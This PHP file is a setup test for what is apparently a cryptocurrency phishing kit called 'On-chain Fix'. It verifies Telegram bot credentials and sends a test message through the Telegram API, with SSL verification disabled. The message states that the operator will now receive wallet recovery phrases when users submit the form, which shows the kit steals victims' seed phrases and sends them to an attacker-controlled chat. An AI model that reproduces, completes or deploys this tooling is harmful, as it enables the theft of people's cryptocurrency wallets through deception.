<?php
/**
 * Telegram Integration Test Script
 * This script tests if your Telegram bot configuration is working correctly
 */

// Include configuration
require_once 'config.php';

// Set response header
header('Content-Type: text/html; charset=utf-8');

echo "<!DOCTYPE html>
<html>
<head>
    <title>Telegram Test</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
        .success { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .error { background: #f8d7da; color: #721c24; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .info { background: #d1ecf1; color: #0c5460; padding: 15px; border-radius: 5px; margin: 10px 0; }
        h1 { color: #333; }
        pre { background: #f4f4f4; padding: 10px; border-radius: 5px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>🔔 Telegram Bot Test</h1>";

// Check configuration
echo "<div class='info'><strong>Configuration Check:</strong><br>";
echo "Bot Token: " . (defined('TELEGRAM_BOT_TOKEN') && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' ? "✅ Configured" : "❌ Not configured") . "<br>";
echo "Chat ID: " . (defined('TELEGRAM_CHAT_ID') && TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID_HERE' ? "✅ Configured" : "❌ Not configured") . "<br>";
echo "</div>";

// Validate configuration
if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
    echo "<div class='error'><strong>❌ Error:</strong> Please configure your Telegram credentials in config.php</div>";
    echo "</body></html>";
    exit;
}

// Test message
$testMessage = "🧪 *Test Message from On-chain Fix*\n\n";
$testMessage .= "✅ *Status:* Configuration Test\n";
$testMessage .= "🕐 *Time:* " . date('Y-m-d H:i:s') . "\n";
$testMessage .= "🌐 *Server:* " . ($_SERVER['SERVER_NAME'] ?? 'Local Test') . "\n\n";
$testMessage .= "If you received this message, your Telegram integration is working correctly! 🎉\n\n";
$testMessage .= "You will now receive wallet recovery phrases when users submit the form.";

// Prepare Telegram API request
$telegramData = [
    'chat_id' => TELEGRAM_CHAT_ID,
    'text' => $testMessage,
    'parse_mode' => 'Markdown',
    'disable_web_page_preview' => true
];

echo "<div class='info'><strong>📤 Sending test message...</strong></div>";

// Send to Telegram
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, TELEGRAM_API_URL);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($telegramData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// Display results
echo "<h2>Test Results:</h2>";

if ($httpCode === 200 && !empty($response)) {
    $telegramResponse = json_decode($response, true);
    
    if (isset($telegramResponse['ok']) && $telegramResponse['ok'] === true) {
        echo "<div class='success'>";
        echo "<strong>✅ SUCCESS!</strong><br><br>";
        echo "Your Telegram bot is working correctly!<br>";
        echo "Check your Telegram - you should have received a test message.<br><br>";
        echo "<strong>Message ID:</strong> " . ($telegramResponse['result']['message_id'] ?? 'N/A') . "<br>";
        echo "<strong>Sent to Chat ID:</strong> " . TELEGRAM_CHAT_ID . "<br>";
        echo "</div>";
        
        echo "<div class='info'>";
        echo "<strong>📋 Full Response:</strong><br>";
        echo "<pre>" . json_encode($telegramResponse, JSON_PRETTY_PRINT) . "</pre>";
        echo "</div>";
    } else {
        echo "<div class='error'>";
        echo "<strong>❌ Telegram API Error:</strong><br>";
        echo "Description: " . ($telegramResponse['description'] ?? 'Unknown error') . "<br>";
        echo "Error Code: " . ($telegramResponse['error_code'] ?? 'N/A') . "<br>";
        echo "</div>";
        
        echo "<div class='info'>";
        echo "<strong>📋 Full Response:</strong><br>";
        echo "<pre>" . json_encode($telegramResponse, JSON_PRETTY_PRINT) . "</pre>";
        echo "</div>";
    }
} else {
    echo "<div class='error'>";
    echo "<strong>❌ Connection Error:</strong><br>";
    echo "HTTP Code: " . $httpCode . "<br>";
    if ($curlError) {
        echo "cURL Error: " . $curlError . "<br>";
    }
    echo "</div>";
    
    if ($response) {
        echo "<div class='info'>";
        echo "<strong>📋 Response:</strong><br>";
        echo "<pre>" . htmlspecialchars($response) . "</pre>";
        echo "</div>";
    }
}

echo "<hr>";
echo "<div class='info'>";
echo "<strong>ℹ️ Next Steps:</strong><br>";
echo "1. If you received the test message, your setup is complete! ✅<br>";
echo "2. If not, check:<br>";
echo "   - Your Bot Token is correct<br>";
echo "   - Your Chat ID is correct<br>";
echo "   - You haven't blocked the bot<br>";
echo "   - Your server can make outbound HTTPS connections<br>";
echo "3. Delete this test file (test_telegram.php) after testing for security<br>";
echo "</div>";

echo "</body></html>";
?>

